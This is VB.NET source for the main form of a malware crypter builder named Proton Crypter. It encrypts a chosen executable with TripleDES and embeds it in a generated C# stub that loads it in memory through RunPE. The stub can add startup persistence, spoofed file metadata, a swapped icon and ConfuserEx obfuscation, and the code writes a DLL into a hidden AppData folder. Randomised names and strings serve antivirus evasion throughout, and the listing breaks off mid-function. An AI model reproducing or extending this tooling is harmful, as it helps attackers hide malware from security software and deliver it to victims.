Imports System.IO
Imports System.Reflection
Imports Microsoft.VisualBasic.CompilerServices
Imports System.CodeDom.Compiler
Imports System.Text
Imports System.Runtime.InteropServices
Imports System.Security
Imports System.Security.Cryptography
Imports System.Threading
Imports ICSharpCode.SharpZipLib.Zip
Imports System.IO.Compression

Public Class frmMain
#Region "SHADOW"
    Private Declare Function CreateRoundRectRgn Lib "Gdi32.dll" (nLeftRect As Integer, nTopRect As Integer, nRightRect As Integer, nBottomRect As Integer, nWidthEllipse As Integer, nHeightEllipse As Integer) As IntPtr
    Public Declare Function DwmExtendFrameIntoClientArea Lib "dwmapi.dll" (hWnd As IntPtr, ByRef pMarInset As MARGINS) As Integer
    Public Declare Function DwmSetWindowAttribute Lib "dwmapi.dll" (hwnd As IntPtr, attr As Integer, ByRef attrValue As Integer, attrSize As Integer) As Integer
    Public Declare Function DwmIsCompositionEnabled Lib "dwmapi.dll" (ByRef pfEnabled As Integer) As Integer
    Protected Overrides ReadOnly Property CreateParams As CreateParams
        Get
            Me.m_aeroEnabled = Me.CheckAeroEnabled()
            Dim a As CreateParams = MyBase.CreateParams
            If Not Me.m_aeroEnabled Then
                a.ClassStyle = a.ClassStyle Or 131072
            End If
            Return a
        End Get
    End Property
    Private Const CS_DROPSHADOW As Integer = 131072
    Private Const WM_NCPAINT As Integer = 133
    Private Const WM_ACTIVATEAPP As Integer = 28
    Private Const WM_NCHITTEST As Integer = 132
    Private Const HTCLIENT As Integer = 1
    Private Const HTCAPTION As Integer = 2
    Private m_aeroEnabled As Boolean
    Private Function CheckAeroEnabled() As Boolean
        Dim result As Boolean
        If Environment.OSVersion.Version.Major >= 6 Then
            Dim num As Integer = 0
            DwmIsCompositionEnabled(num)
            result = (num = 1)
        Else
            result = False
        End If
        Return result
    End Function
    Protected Overrides Sub WndProc(ByRef m As Message)
        Dim msg As Integer = m.Msg
        If msg = 133 Then
            If Me.m_aeroEnabled Then
                Dim num As Integer = 2
                DwmSetWindowAttribute(MyBase.Handle, 2, num, 4)
                Dim margins As MARGINS = New MARGINS() With {.bottomHeight = 1, .leftWidth = 1, .rightWidth = 1, .topHeight = 1}
                DwmExtendFrameIntoClientArea(MyBase.Handle, margins)
            End If
        End If
        MyBase.WndProc(m)
        If m.Msg = 132 AndAlso CInt(m.Result) = 1 Then
            m.Result = CType(2, IntPtr)
        End If
    End Sub
#End Region
#Region "DOTNET"
    Public Shared Function DotNet(bytesdotnet As Byte()) As Boolean
        Dim result As Boolean
        Try
            Assembly.Load(bytesdotnet)
            result = True
        Catch ex As Exception
            result = False
        End Try
        Return result
    End Function
#End Region
#Region "CODEDOM"
    Sub Codedom(ByVal Path As String, ByVal Code As String, ByVal MainClass As String)
        Dim providerOptions = New Collections.Generic.Dictionary(Of String, String) 'Thanks to Cobac for adding this.
        providerOptions.Add("CompilerVersion", "v4.0")
        Dim CodeProvider As New Microsoft.CSharp.CSharpCodeProvider(providerOptions)
        Dim Parameters As New CompilerParameters
        With Parameters
            .GenerateExecutable = True
            .OutputAssembly = Path
            .CompilerOptions += "/platform:X86 /unsafe /target:winexe"
            .MainClass = MainClass
            .IncludeDebugInformation = False
            .ReferencedAssemblies.Add("System.Windows.Forms.dll")
            .ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
            .ReferencedAssemblies.Add("System.Linq.dll")
            .ReferencedAssemblies.Add("System.Core.dll")
            .ReferencedAssemblies.Add("System.Data.dll")
            .ReferencedAssemblies.Add("System.Deployment.dll")
            .ReferencedAssemblies.Add("System.Drawing.dll")
            .ReferencedAssemblies.Add("System.Xml.dll")
            .ReferencedAssemblies.Add("System.Xml.Linq.dll")
            .ReferencedAssemblies.Add("System.dll")
            .ReferencedAssemblies.Add(Process.GetCurrentProcess().MainModule.FileName)
            .ReferencedAssemblies.Add(Application.ExecutablePath)
        End With
        Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, Code)
        If Results.Errors.Count > 0 Then
            For Each E In Results.Errors
                MsgBox(E.ErrorText)
            Next
        End If
    End Sub
#End Region
#Region "ENCRYPTION"
    Public Shared Function About(ByRef data As Byte(), ByRef pass As String)
        Dim a As New System.Security.Cryptography.MD5CryptoServiceProvider()
        Dim i As Byte() = a.ComputeHash(System.Text.ASCIIEncoding.Unicode.GetBytes(pass))
        Dim s As New System.Security.Cryptography.TripleDESCryptoServiceProvider()
        s.Key = i
        s.Mode = System.Security.Cryptography.CipherMode.ECB
        Return s.CreateEncryptor().TransformFinalBlock(data, 0, data.Length)
    End Function
    Public Function Runpe(ByRef data As Byte()) As Object
        Dim a As New System.Text.StringBuilder()
        Dim s As Byte() = About(data, TextBox3.Text)
        For i As Integer = 0 To s.Length - 1
            Dim x As Byte = s(i)
            a.Append(x)
            a.Append(",")

        Next
        Return a.ToString().Remove(a.Length - 1)
    End Function
#End Region
#Region "RANDOMSTRING"
    Dim T As New Random
    Function RandomString() As String
        Dim eng As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
        Dim chn As String = "艾诶比西迪伊弗吉尺杰开勒我內普曲氏明德拉拉劇氏瑪我山蛋托克和閃卡雙劇馬闕黑我拉報網德盟雙德本報截和庵爾歐丁喇喬金歐盟本爾諾特底的配迪流金蛋金庵斯流喬拉本歐桃桃拉蛋莎奧伴腿雙桃報和德流喇代德伴德本普和加金歐截截代我瑪山的盟的塔喬拉士庵士問歐爾闕一喬德的嗯斯氏魚本蛋爾底闕氏破特雙伴桃截闕或駛歐盟托氏德普斯曲特和明喇加明進歐底黑破曲盟子和我庵闕本韋曲子的底喬底子士拉迪流或埋歐塔普流諾我進丁德氏加莎爾塔河馬迪爾塔拉山代或德哈托去破馬士一冰特奧子歐桃塔駛明德桃馬網拉喬金德斯马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德士曲冰桃腿丁喇塔截冰雙金的拉闕馬歐韋截莎普諾流斯馬破拉瑪拉本和網盟布魚截卡牛腿明和諾拉拉我卡普哈截破或馬桃一托歐莎德山的爾賃亞內貝和艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德"
        Dim heb As String = "אבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשת"
        Dim arb As String = "ابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهوي"
        Dim mix As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهوي艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德אבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשת"
        Dim s As String
        s = eng
        Dim sb As New StringBuilder
        For i As Integer = 1 To 11
            Dim idx As Integer = T.Next(0, 177)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString
    End Function

    Public Function RandomGenerator()
        Randomize()
        Dim a = Int((10 - 1) * Rnd()) + 1
        Return a
    End Function
    Public Function Generator()
        Randomize()
        Dim a = Int((50 - 10) * Rnd()) + 10
        Return a
    End Function
#End Region
#Region "ASSEMBLY"
    Dim FileTitle As String
    Dim FileDescription As String
    Dim FileCompany As String
    Dim Fileproduct As String
    Dim Filecopyright As String
    Dim Fileversion1 As Integer
    Dim Fileversion2 As Integer
    Dim Fileversion3 As Integer
    Dim Fileversion4 As Integer
    Sub ReadAssembly(ByVal Filepath As String)
        Dim f As FileVersionInfo = FileVersionInfo.GetVersionInfo(Filepath)
        FileTitle = f.InternalName
        FileDescription = f.FileDescription
        FileCompany = f.CompanyName
        Fileproduct = f.ProductName
        Filecopyright = f.LegalCopyright
        Dim version As String()
        If f.FileVersion.Contains(",") Then
            version = f.FileVersion.Split(","c)
        Else
            version = f.FileVersion.Split("."c)
        End If
        Try
            Fileversion1 = version(0)
            Fileversion2 = version(1)
            Fileversion3 = version(2)
            Fileversion4 = version(3)
        Catch ex As Exception
        End Try
    End Sub
#End Region
    Private Sub frmMain_Load(sender As Object, e As EventArgs) Handles MyBase.Load
      
        Me.WindowState = FormWindowState.Normal
        Me.MinimumSize = Me.Size
        Me.MaximumSize = Me.Size
        Dim EytPo As String = System.Windows.Forms.Application.UserAppDataPath + "\Proton"
        Dim elFpv As Boolean = Not Directory.Exists(EytPo)
        If elFpv Then
            Dim qskGy As DirectoryInfo = Directory.CreateDirectory(EytPo)
            qskGy.Attributes = (FileAttributes.Hidden Or FileAttributes.Directory)
        End If
        File.WriteAllBytes(System.Windows.Forms.Application.UserAppDataPath + "\Proton\Proton.dll", My.Resources.Proton1)
        TextBox3.Text = RandomString()
        Label9.Text = "Proton Crypter Free Version 2.3.0" + "[ " + Environment.UserName + " ]"
    End Sub

    Private Sub Label1_Click(sender As Object, e As EventArgs) Handles Label1.Click
        Environment.Exit(2)
    End Sub

    Private Sub MyButton1_Click(sender As Object, e As EventArgs) Handles MyButton1.Click
        Dim Open As New OpenFileDialog
        Open.Filter = "Executable Files (*.exe)|*.exe"
        If Open.ShowDialog = vbOK Then
            TextBox1.Text = Open.FileName
            If DotNet(File.ReadAllBytes(Open.FileName)) Then
                Label10.Text = ".NET File"
            Else
                Label10.Text = "Native File"
            End If
            Dim FileInfo As FileInfo = New FileInfo(Open.FileName)
            Dim Num As Integer = CInt(FileInfo.Length)
            Me.Label12.Text = Conversions.ToString(CDbl(Num) / 1000.0) + " KB"
        End If

    End Sub

    Private Sub MyButton2_Click(sender As Object, e As EventArgs) Handles MyButton2.Click
        Dim Open As New OpenFileDialog
        Open.Filter = "Icon Files (*.ico)|*.ico"
        If Open.ShowDialog = vbOK Then
            TextBox2.Text = Open.FileName
            PictureBox4.Image = Drawing.Icon.ExtractAssociatedIcon(TextBox2.Text).ToBitmap
        End If
    End Sub

    Private Sub CustomCheckBox2_CheckedChanged(sender As Object, e As EventArgs) Handles CustomCheckBox2.CheckedChanged
        If CustomCheckBox2.Checked Then
            TextBoxTitle.Enabled = True
            TextBoxDescription.Enabled = True
            TextBoxCompany.Enabled = True
            TextBoxProduct.Enabled = True
            TextBoxCopyright.Enabled = True
            TextBoxNum1.Enabled = True
            TextBoxNum2.Enabled = True
            TextBoxNum3.Enabled = True
            TextBoxNum4.Enabled = True
            MyButton5.Enabled = True
            MyButton6.Enabled = True
        Else
            TextBoxTitle.Enabled = False
            TextBoxDescription.Enabled = False
            TextBoxCompany.Enabled = False
            TextBoxProduct.Enabled = False
            TextBoxCopyright.Enabled = False
            TextBoxNum1.Enabled = False
            TextBoxNum2.Enabled = False
            TextBoxNum3.Enabled = False
            TextBoxNum4.Enabled = False
            MyButton5.Enabled = False
            MyButton6.Enabled = False
        End If
    End Sub

    Private Sub CustomCheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CustomCheckBox1.CheckedChanged
        If CustomCheckBox1.Checked Then
            TextBox11.Enabled() = True
            TextBox12.Enabled = True
            TextBox13.Enabled = True
            MyButton5.Enabled() = True
        Else
            TextBox11.Enabled() = False
            TextBox13.Enabled() = False
            TextBox12.Enabled = False
            MyButton5.Enabled() = False
        End If
    End Sub
    Dim vcFUoknuUGOaxmFuhuaHnywrk As String
    Private Sub MyButton7_Click(sender As Object, e As EventArgs) Handles MyButton7.Click
        If TextBox1.Text = "" Then

        Else
            Dim Save As New SaveFileDialog
            Save.Filter = "Executable Files (*.exe)|*.exe"
            Save.FileName = ""
            If Save.ShowDialog = vbOK Then
                Dim zRKeGcaxgOwevQcLbXlnMPLUg As Byte() = IO.File.ReadAllBytes(TextBox1.Text)
                Dim TcedkgPxAgCFAbRalKelOqNQO As String = Runpe(zRKeGcaxgOwevQcLbXlnMPLUg)
                Dim xbfojvcMcSyNLuOlSLETLlKqI As Byte() = File.ReadAllBytes(System.Windows.Forms.Application.UserAppDataPath + "\Proton\Proton.dll")
                Dim SElTLhRKgmwAXLagyYTCmtaXF As String = Runpe(xbfojvcMcSyNLuOlSLETLlKqI)
                Dim nbsaWumrcpYk As String = My.Resources.Proton
                nbsaWumrcpYk = nbsaWumrcpYk.Replace("%1%", RandomString()).Replace("%2%", RandomString()).Replace("%3%", RandomString()).Replace("%4%", RandomString()).Replace("%5%", RandomString()).Replace("%28%", RandomString()).Replace("%6%", RandomString()).Replace("%7%", RandomString()).Replace("%8%", RandomString()).Replace("%9%", RandomString()).Replace("%10%", RandomString()).Replace("%11%", RandomString()).Replace("%12%", RandomString()).Replace("%13%", RandomString()).Replace("%14%", RandomString()).Replace("%15%", RandomString()).Replace("%16%", RandomString()).Replace("%17%", RandomString()).Replace("%18%", RandomString()).Replace("%19%", RandomString()).Replace("%20%", RandomString()).Replace("%21%", RandomString()).Replace("%22%", RandomString()).Replace("%23%", RandomString()).Replace("%24%", RandomString()).Replace("%25%", RandomString()).Replace("%44%", RandomString()).Replace("%26%", RandomString()).Replace("%35%", RandomString()).Replace("%36%", RandomString()).Replace("%37%", RandomString()).Replace("%29%", RandomString()).Replace("%27%", RandomString()).Replace("%90%", RandomString()).Replace("%Atom%", RichTextBox2.Text).Replace("%30%", RandomString()).Replace("%31%", RandomString()).Replace("%34%", RandomString()).Replace("%32%", RandomString()).Replace("%RunpePassword%", TextBox3.Text()).Replace("%Razor%", TcedkgPxAgCFAbRalKelOqNQO).Replace("%Runpe%", SElTLhRKgmwAXLagyYTCmtaXF).Replace("%Password%", TextBox3.Text).Replace("%FolderName%", TextBox11.Text()).Replace("%Name%", TextBox12.Text()).Replace("%Startup File Name%", TextBox13.Text())
                vcFUoknuUGOaxmFuhuaHnywrk = nbsaWumrcpYk
                If CustomCheckBox1.Checked = True Then
                    vcFUoknuUGOaxmFuhuaHnywrk = Replace(vcFUoknuUGOaxmFuhuaHnywrk, "//Startup ", Nothing)
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("%Name%", TextBox12.Text)
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("%FolderName%", TextBox11.Text)
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("%Startup File Name%", TextBox13.Text)

                Else
                    vcFUoknuUGOaxmFuhuaHnywrk = Replace(vcFUoknuUGOaxmFuhuaHnywrk, "//Startup", "//" + RandomString())
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("%Name%", RandomString)
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("%FolderName%", RandomString)
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("%Startup File Name%", RandomString)
                End If
                If CustomCheckBox2.Checked = True Then
                    vcFUoknuUGOaxmFuhuaHnywrk = Replace(vcFUoknuUGOaxmFuhuaHnywrk, "//Assembly ", Nothing)
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{1}", TextBoxTitle.Text)
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{2}", TextBoxDescription.Text)
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{3}", TextBoxCompany.Text)
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{4}", TextBoxProduct.Text)
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{5}", TextBoxCopyright.Text)
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{7}", TextBoxNum1.Text)
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{8}", TextBoxNum2.Text)
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{9}", TextBoxNum3.Text)
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{10}", TextBoxNum4.Text)
                    vcFUoknuUGOaxmFuhuaHnywrk = Replace(vcFUoknuUGOaxmFuhuaHnywrk, "//Default", "//" + RandomString())
                Else
                    vcFUoknuUGOaxmFuhuaHnywrk = Replace(vcFUoknuUGOaxmFuhuaHnywrk, "//Assembly", "//" + RandomString())
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{1}", RandomString)
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{2}", RandomString)
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{3}", RandomString)
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{4}", RandomString)
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{5}", RandomString)
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{7}", RandomString)
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{8}", RandomString)
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{9}", RandomString)
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{10}", RandomString)
                    vcFUoknuUGOaxmFuhuaHnywrk = Replace(vcFUoknuUGOaxmFuhuaHnywrk, "//Default", Nothing)
                End If
                Codedom(Save.FileName, vcFUoknuUGOaxmFuhuaHnywrk, Nothing)

                If TextBox2.Text = "" Then
                Else
                    IconInjector.InjectIcon(Save.FileName, TextBox2.Text)
                End If
                If CustomCheckBox3.Checked = True Then
                    Confuser.Obfuscate(Save.FileName)
                    File.Delete(Save.FileName)
                    'If Not Directory.Exists((Application.StartupPath & "\Extensions")) Then
                    '    Directory.CreateDirectory((Application.StartupPath & "\Extensions"))
                    'End If

                    'Thread.Sleep(50)
                    'Shell(("cmd.exe /C Extensions\Proton.exe """ & Save.FileName & """"), AppWinStyle.NormalFocus, True, -1)
                    'File.Delete(Save.FileName)
                Else

                End If


                Clipboard.SetText(vcFUoknuUGOaxmFuhuaHnywrk)
                MessageBox.Show(My.Resources.read, Label9.Text, MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
                RichTextBox1.Text = ""
            End If
        End If

    End Sub

    Private Sub MyButton4_Click(sender As Object, e As EventArgs) Handles MyButton4.Click
        TextBox3.Text = RandomString()
    End Sub

    Private Sub MyButton6_Click(sender As Object, e As EventArgs) Handles MyButton6.Click
        Try
            Dim Open As New OpenFileDialog
            Open.Filter = "All Files (*.*)|*.*"
            If Open.ShowDialog = vbOK Then
                ReadAssembly(Open.FileName)
                TextBoxTitle.Text = FileTitle
                TextBoxDescription.Text = FileDescription
                TextBoxCompany.Text = FileCompany
                TextBoxProduct.Text = Fileproduct
                TextBoxCopyright.Text = Filecopyright
                TextBoxNum1.Text = Fileversion1
                TextBoxNum2.Text = Fileversion2
                TextBoxNum3.Text = Fileversion3
                TextBoxNum4.Text = Fileversion4
            End If
        Catch Complexious As Exception
        End Try
    End Sub

    Private Sub MyButton5_Click(sender As Object, e As EventArgs) Handles MyButton5.Click
        TextBox13.Text = Randomization.RandomPassword.Generate(10, 10) + ".exe"
        TextBox11.Text = Randomization.RandomPassword.Generate(10, 10)
        TextBox12.Text = Randomization.RandomPassword.Generate(10, 10)
    End Sub

    Private Sub Label20_Click(sender As Object, e As EventArgs) Handles Label20.Click
        Process.Start("http://www.theprotonprotector.com/")
    End Sub

    Private Sub Label21_Click(sender As Object, e As EventArgs) Handles Label21.Click
        Process.Start("https://discord.com/invite/npe7x9Q")
    End Sub
End Class
#Region "OBFUSCATOR"
Friend Class Confuser
    Public Shared Sub Obfuscate(hSlyGQfwnjPpVOnmKFKsqFmQh As String)
        Try
            Dim text As String = Path.GetTempPath() + "configconfuser.crproj"
            Dim text2 As String = My.Resources.config
            Dim text3 As String = Path.GetTempPath() + "Confuser"
            Dim text4 As String = New FileInfo(hSlyGQfwnjPpVOnmKFKsqFmQh).Directory.ToString()
            text2 = text2.Replace("%path%", text4 + "\" + Randomization.RandomPassword.Generate(5, 5)).Replace("%basedir%", text4).Replace("%stub%", hSlyGQfwnjPpVOnmKFKsqFmQh)
            File.WriteAllText(text, text2)
            File.WriteAllBytes(Path.GetTempPath() + "confuser.zip", My.Resources.ConfuserEx)
            If Directory.Exists(text3) Then
                Directory.Delete(text3, True)
            End If
            Directory.CreateDirectory(text3)
            ZipFile.ExtractToDirectory(Path.GetTempPath() + "confuser.zip", text3)
            Dim process As Process = process.Start(New ProcessStartInfo() With {.FileName = text3 + "\Confuser.CLI.exe", .UseShellExecute = True, .WindowStyle = ProcessWindowStyle.Hidden, .Arguments = "-n " + text})
            process.WaitForExit()
            File.Delete(Path.GetTempPath() + "confuser.zip")
            File.Delete(Path.GetTempPath() + "configconfuser.crproj")
            Directory.Delete(text3, True)
        Catch ex As Exception
        End Try
    End Sub
End Class
#End Region
#Region "MARGINS"
Public Structure MARGINS
    Public leftWidth As Integer
    Public rightWidth As Integer
    Public topHeight As Integer
    Public bottomHeight As Integer
End Structure
#End Region
#Region "ICON"
Public Class IconInjector

    <SuppressUnmanagedCodeSecurity()> _
    Private Class NativeMethods
        <DllImport("kernel32")> _
        Public Shared Function BeginUpdateResource( _
            ByVal fileName As String, _
            <MarshalAs(UnmanagedType.Bool)> ByVal deleteExistingResources As Boolean) As IntPtr
        End Function

        <DllImport("kernel32")> _
        Public Shared Function UpdateResource( _
            ByVal hUpdate As IntPtr, _
            ByVal type As IntPtr, _
            ByVal name As IntPtr, _
            ByVal language As Short, _
            <MarshalAs(UnmanagedType.LPArray, SizeParamIndex:=5)> _
            ByVal data() As Byte, _
            ByVal dataSize As Integer) As <MarshalAs(UnmanagedType.Bool)> Boolean
        End Function

        <DllImport("kernel32")> _
        Public Shared Function EndUpdateResource( _
            ByVal hUpdate As IntPtr, _
            <MarshalAs(UnmanagedType.Bool)> ByVal discard As Boolean) As <MarshalAs(UnmanagedType.Bool)> Boolean
        End Function
    End Class

    ' The first structure in an ICO file lets us know how many images are in the file.
    <StructLayout(LayoutKind.Sequential)> _
    Private Structure ICONDIR
        Public Reserved As UShort  ' Reserved, must be 0
        Public Type As UShort      ' Resource type, 1 for icons.
        Public Count As UShort     ' How many images.
        ' The native structure has an array of ICONDIRENTRYs as a final field.
    End Structure

    ' Each ICONDIRENTRY describes one icon stored in the ico file. The offset says where the icon image data
    ' starts in the file. The other fields give the information required to turn that image data into a valid
    ' bitmap.
    <StructLayout(LayoutKind.Sequential)> _
    Private Structure ICONDIRENTRY
        Public Width As Byte            ' Width, in pixels, of the image
        Public Height As Byte           ' Height, in pixels, of the image
        Public ColorCount As Byte       ' Number of colors in image (0 if >=8bpp)
        Public Reserved As Byte         ' Reserved ( must be 0)
        Public Planes As UShort         ' Color Planes
        Public BitCount As UShort       ' Bits per pixel
        Public BytesInRes As Integer   ' Length in bytes of the pixel data
        Public ImageOffset As Integer  ' Offset in the file where the pixel data starts.
    End Structure

    ' Each image is stored in the file as an ICONIMAGE structure:
    'typdef struct
    '{
    '   BITMAPINFOHEADER   icHeader;      // DIB header
    '   RGBQUAD         icColors[1];   // Color table
    '   BYTE            icXOR[1];      // DIB bits for XOR mask
    '   BYTE            icAND[1];      // DIB bits for AND mask
    '} ICONIMAGE, *LPICONIMAGE;


    <StructLayout(LayoutKind.Sequential)> _
    Private Structure BITMAPINFOHEADER
        Public Size As UInteger
        Public Width As Integer
        Public Height As Integer
        Public Planes As UShort
        Public BitCount As UShort
        Public Compression As UInteger
        Public SizeImage As UInteger
        Public XPelsPerMeter As Integer
        Public YPelsPerMeter As Integer
        Public ClrUsed As UInteger
        Public ClrImportant As UInteger
    End Structure

    ' The icon in an exe/dll file is stored in a very similar structure:
    <StructLayout(LayoutKind.Sequential, Pack:=2)> _
    Private Structure GRPICONDIRENTRY
        Public Width As Byte
        Public Height As Byte
        Public ColorCount As Byte
        Public Reserved As Byte
        Public Planes As UShort
        Public BitCount As UShort
        Public BytesInRes As Integer
        Public ID As UShort
    End Structure

    Public Shared Sub InjectIcon(ByVal exeFileName As String, ByVal iconFileName As String)
        InjectIcon(exeFileName, iconFileName, 1, 1)
    End Sub

    Public Shared Sub InjectIcon(ByVal exeFileName As String, ByVal iconFileName As String, ByVal iconGroupID As UInteger, ByVal iconBaseID As UInteger)
        Const RT_ICON = 3UI
        Const RT_GROUP_ICON = 14UI
        Dim iconFile As IconFile = iconFile.FromFile(iconFileName)
        Dim hUpdate = NativeMethods.BeginUpdateResource(exeFileName, False)
        Dim data = iconFile.CreateIconGroupData(iconBaseID)
        NativeMethods.UpdateResource(hUpdate, New IntPtr(RT_GROUP_ICON), New IntPtr(iconGroupID), 0, data, data.Length)
        For i = 0 To iconFile.ImageCount - 1
            Dim image = iconFile.ImageData(i)
            NativeMethods.UpdateResource(hUpdate, New IntPtr(RT_ICON), New IntPtr(iconBaseID + i), 0, image, image.Length)
        Next
        NativeMethods.EndUpdateResource(hUpdate, False)
    End Sub

    Private Class IconFile

        Private iconDir As New ICONDIR
        Private iconEntry() As ICONDIRENTRY
        Private iconImage()() As Byte

        Public ReadOnly Property ImageCount As Integer
            Get
                Return iconDir.Count
            End Get
        End Property

        Public ReadOnly Property ImageData(ByVal index As Integer) As Byte()
            Get
                Return iconImage(index)
            End Get
        End Property

        Private Sub New()
        End Sub

        Public Shared Function FromFile(ByVal filename As String) As IconFile
            Dim instance As New IconFile
            ' Read all the bytes from the file.
            Dim fileBytes() As Byte = IO.File.ReadAllBytes(filename)
            ' First struct is an ICONDIR
            ' Pin the bytes from the file in memory so that we can read them.
            ' If we didn't pin them then they could move around (e.g. when the
            ' garbage collector compacts the heap)
            Dim pinnedBytes = GCHandle.Alloc(fileBytes, GCHandleType.Pinned)
            ' Read the ICONDIR
            instance.iconDir = DirectCast(Marshal.PtrToStructure(pinnedBytes.AddrOfPinnedObject, GetType(ICONDIR)), ICONDIR)
            ' which tells us how many images are in the ico file. For each image, there's a ICONDIRENTRY, and associated pixel data.
            instance.iconEntry = New ICONDIRENTRY(instance.iconDir.Count - 1) {}
            instance.iconImage = New Byte(instance.iconDir.Count - 1)() {}
            ' The first ICONDIRENTRY will be immediately after the ICONDIR, so the offset to it is the size of ICONDIR
            Dim offset = Marshal.SizeOf(instance.iconDir)
            ' After reading an ICONDIRENTRY we step forward by the size of an ICONDIRENTRY            
            Dim iconDirEntryType = GetType(ICONDIRENTRY)
            Dim size = Marshal.SizeOf(iconDirEntryType)
            For i = 0 To instance.iconDir.Count - 1
                ' Grab the structure.
                Dim entry = DirectCast(Marshal.PtrToStructure(New IntPtr(pinnedBytes.AddrOfPinnedObject.ToInt64 + offset), iconDirEntryType), ICONDIRENTRY)
                instance.iconEntry(i) = entry
                ' Grab the associated pixel data.
                instance.iconImage(i) = New Byte(entry.BytesInRes - 1) {}
                Buffer.BlockCopy(fileBytes, entry.ImageOffset, instance.iconImage(i), 0, entry.BytesInRes)
                offset += size
            Next
            pinnedBytes.Free()
            Return instance
        End Function

        Public Function CreateIconGroupData(ByVal iconBaseID As UInteger) As Byte()
            ' This will store the memory version of the icon.
            Dim sizeOfIconGroupData As Integer = Marshal.SizeOf(GetType(ICONDIR)) + Marshal.SizeOf(GetType(GRPICONDIRENTRY)) * ImageCount
            Dim data(sizeOfIconGroupData - 1) As Byte
            Dim pinnedData = GCHandle.Alloc(data, GCHandleType.Pinned)
            Marshal.StructureToPtr(iconDir, pinnedData.AddrOfPinnedObject, False)
            Dim offset = Marshal.SizeOf(iconDir)
            For i = 0 To ImageCount - 1
                Dim grpEntry As New GRPICONDIRENTRY
                Dim bitmapheader As New BITMAPINFOHEADER
